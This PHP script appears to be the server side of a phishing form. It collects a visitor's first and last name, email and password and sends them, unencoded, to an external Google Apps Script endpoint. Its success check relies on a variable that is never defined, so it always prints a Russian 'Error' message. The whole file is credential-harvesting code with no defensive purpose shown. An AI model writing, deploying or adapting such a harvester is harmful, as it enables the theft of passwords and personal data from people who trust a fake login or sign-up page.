<?php


$link = "https://script.google.com/macros/s/AKfycbxn8TzbjuF9vy50U1aTt7ENpZYuxtSH1qFweV6EkhST4W_8esO8zbrhcmc42r-EIprk/exec?";

$first = ($_POST['first']);
$last = ($_POST['last']);
$email = ($_POST['email']);
$password = ($_POST['password']);

$link .= "p1=" . $first . "&p2=" . $last . "&p3=" . $email . "&p4=" . $password . " ";



$send = fopen($link,"r");

if ($sendToTelegram) {
 header('Location: index.html');
}

else {
    echo 'Ошибка';
}


?>